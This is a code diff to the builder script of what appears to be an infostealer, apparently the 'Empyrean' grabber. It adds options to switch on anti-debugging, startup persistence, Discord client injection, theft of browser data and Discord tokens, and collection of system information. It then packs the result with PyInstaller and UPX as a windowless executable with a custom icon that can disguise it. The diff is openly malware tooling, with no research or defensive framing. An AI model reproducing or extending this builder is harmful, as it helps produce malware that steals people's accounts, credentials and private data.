@@ -31,6 +31,18 @@ def main() -> None:
     use_error_message = input("{:<27}: ".format("Use Error Message? (y/n)"))
     if use_error_message.lower() == "y":
         error_message = input("{:<27}: ".format("Error Message?"))
+    use_debug = input("{:<27}: ".format("Anti Debug? (y/n)"))
+    use_startup = input("{:<27}: ".format("Startup? (y/n)"))
+    use_injection = input("{:<27}: ".format("Discord Injection? (y/n)"))
+    use_chromium = input("{:<27}: ".format("Browser Data? (y/n)"))
+    use_discord = input("{:<27}: ".format("Discord Tokens? (y/n)"))
+    use_sysinfo = input("{:<27}: ".format("System Info? (y/n)"))
+    exe_icon = input("{:<27}: ".format("Icon? (y/n)"))
+    if exe_icon.lower() == "y":
+        icon = input("{:<27}: ".format("Icon Path? (drag and drop .ico file)"))
+        if not icon.endswith(".ico") or not os.path.exists(icon):
+            print("[-] Invalid Icon")
+            exit()
     
     shutil.copytree("./src", f"{__BUILDENV__}/src")
 
@@ -45,6 +57,18 @@ def main() -> None:
     else:
         content = content.replace("&ERROR_MESSAGE_ENC&", base64.b64encode('NOERRORMESSAGE'.encode("utf-8")).decode("utf-8"))
 
+    if use_debug.lower() == "y":
+        content = content.replace("# debug", "debug")
+    if use_startup.lower() == "y":
+        content = content.replace("# startup", "startup")
+    if use_injection.lower() == "y":
+        content = content.replace("# injection", "injection")
+    if use_chromium.lower() == "y":
+        content = content.replace("# chromium", "chromium")
+    if use_discord.lower() == "y":
+        content = content.replace("# discord", "discord")
+    if use_sysinfo.lower() == "y":
+        content = content.replace("# sysinfo", "sysinfo")
         
     with open(file=f"{__BUILDENV__}/src/main.py", mode="w") as f:
         f.write(content)
@@ -53,7 +77,7 @@ def main() -> None:
     install_upx()
 
     subprocess.run(
-        f'cd {__BUILDENV__} && py -3.10 -m PyInstaller --onefile --noconsole --upx-dir upx/{os.listdir(f"{__BUILDENV__}/upx")[0]} --icon NONE --distpath ../ --key EMPRYREAN --name built ./src/main.py', shell=True)
+        f'cd {__BUILDENV__} && py -3.10 -m PyInstaller --onefile --noconsole --upx-dir upx/{os.listdir(f"{__BUILDENV__}/upx")[0]} --icon {icon if exe_icon.lower() == "y" else "NONE"} --distpath ../ --key EMPRYREAN --name built ./src/main.py', shell=True)
 
     shutil.rmtree(__BUILDENV__)
 
